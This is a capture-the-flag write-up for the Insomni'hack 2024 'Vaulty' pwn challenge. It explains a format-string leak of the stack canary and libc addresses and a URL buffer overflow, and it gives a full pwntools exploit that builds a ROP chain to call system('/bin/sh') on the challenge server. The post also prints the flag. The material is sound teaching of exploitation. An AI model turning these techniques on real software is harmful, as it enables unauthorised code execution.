---
title: "Insomni'hack Teaser 2024 — Vaulty"
date: 2024-01-20
draft: false
tags: ["pwn", "format-string", "rop", "buffer-overflow"]
categories: ["Insomni'hack 2024"]
authors: ["CubikMan47"]
summary: "Exploiting a format string vulnerability to leak the canary and libc, then ROP to shell via a buffer overflow in a password manager binary."
---

## Introduction

In this challenge, we are given a binary that, upon execution, allows us to store and retrieve up to 10 entries in what resembles a password manager. Our objective, as usual, is to find a way to open a shell and read the file containing the flag.

## Initial exploration

The binary has a main menu with four options: create, modify, delete, or print an entry. Each entry is composed of three strings: a username, a password, and a URL, although they are not used in any meaningful way, but just stored.

When opening the binary in Ghidra, we see that depending on user choice, one of four different functions gets called; since no names are present in the binary, I renamed them inside Ghidra to `{create,modify,delete,print}_entry`. Additionally, I used a very handy `objcopy` command (`objcopy vaulty --add-symbol <name>=.text:<addr>,global,function vaulty2`) to add names to the binary itself, making them available inside gdb.

Let's now look at these functions:

- `create_entry` reads a username, a password, and a URL from the user to the stack, and then immediately copies all 32 bytes of each string to a preallocated array of entries. This function, however, does not limit the amount of input we can send as a URL, thus making an easy buffer overflow possible.
- `print_entry` uses `printf` to display an entry, however, does so in a way that the three strings are interpreted as the format, thus allowing us to create entries with specially-crafted strings that will allow us to read data from any address.
- `modify_entry` works in a way very similar to the `create_entry` function but does not read data and then copy it, opting instead to directly write to the entry. Like `create_entry`, this function doesn't check the length of the URL.
- `delete_entry` deletes an entry and shifts all entries after it by one so that the array doesn't have holes.

## The attack

The general plan, with the information we gathered above, is this:

- Using the format-string vulnerability, leak the canary, the address of libc, and the address of the binary
- Send a very long input to overflow the stack of the `create_entry` function
- Use Return-Oriented Programming to call `system("/bin/sh")` and read the flag.

### Leaking the stack with printf

Allowing the user to control the format specifier is what's called a "format string vulnerability", and is pretty easy to exploit. Format specifiers are written like this: `%[<index>$]<format>`, where `<index>` is used to tell printf which of the passed arguments should be formatted, and `<format>` specifies how to print it. However, the index is not checked against the actual number of arguments, so we can abuse the facts that parameters after a certain number are passed on the stack, and make `printf` print the location they would be in, thus leaking the contents of the memory. For this challenge, I used `%<index>$llx` as the payload, which prints a `long long` (8 bytes) number in hexadecimal.

By scripting the interaction with the binary, we can create an entry with a name, print the entry, thus executing our format specifier and leaking data, and then delete the entry to free space for the next iteration. The function below does exactly that:

```python
def leak_stack_offset(r, off):
    r.sendline(b'1')
    r.sendline(f'%{off}$016llx'.encode())
    r.sendline(b'password')
    r.sendline(b'url')
    r.sendline(b'4')
    r.sendlineafter(b'Select an entry to view (0-', b'0')
    r.recvline()
    ret = r.recvline().decode().lstrip('Username: ').strip()
    r.sendline(b'3')
    r.sendline(b'0')
    r.recvuntil(b'Entry deleted successfully.')
    return ret
```

### Exploring the stack

By calling the function above in a loop, we can view what the stack contains and find the canary and addresses to both libc and the binary:

```python
canary = leak_stack_offset(r, 11)
base = leak_stack_offset(r, 13) - 0x1984
libc_base = leak_stack_offset(r, 3) - 0x114697
```

### Calling `system("/bin/sh")`

The final step is to use all the leaks to overflow the stack and use ROP to open a shell:

```python
binsh = next(libc.search(b'/bin/sh'))
rop = ROP([elf, libc])
rop.raw(rop.ret)
rop.system(binsh)
payload = cyclic(0x28) + p64(canary) + cyclic(0x18) + bytes(rop)
```

## Full exploit

```python
from pwn import *

def leak_stack_offset(r, off):
    r.sendlineafter(b'Enter your choice (1-5):\n', b'1')
    r.sendlineafter(b'Username:', f'%{off}$016llx'.encode())
    r.sendlineafter(b'Password:', b'password')
    r.sendlineafter(b'URL:', b'url')
    r.sendlineafter(b'Enter your choice (1-5):\n', b'4')
    r.sendlineafter(b'Select an entry to view (0-', b'0')
    r.recvline()
    ret = int(r.recvline().decode().lstrip('Username: ').strip(), 16)
    r.sendlineafter(b'Enter your choice (1-5):\n', b'3')
    r.sendlineafter(b'Select an entry to delete (0-0):', b'0')
    r.recvuntil(b'Entry deleted successfully.')
    return ret

context.binary = elf = ELF('./vaulty2')
libc = ELF('./libc.so.6')
r = remote('vaulty.insomnihack.ch', 4556)

canary = leak_stack_offset(r, 11)
base = leak_stack_offset(r, 13) - 0x1984
libc_base = leak_stack_offset(r, 3) - 0x114697
elf.address = base
libc.address = libc_base

binsh = next(libc.search(b'/bin/sh'))
rop = ROP([elf, libc])
rop.raw(rop.ret)
rop.system(binsh)
payload = cyclic(0x28) + p64(canary) + cyclic(0x18) + bytes(rop)

r.sendline(b'1')
r.sendline(p64(libc.functions['system'].address))
r.sendline(b'password')
r.sendline(payload)
r.interactive()
```

**Flag:** `INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}`
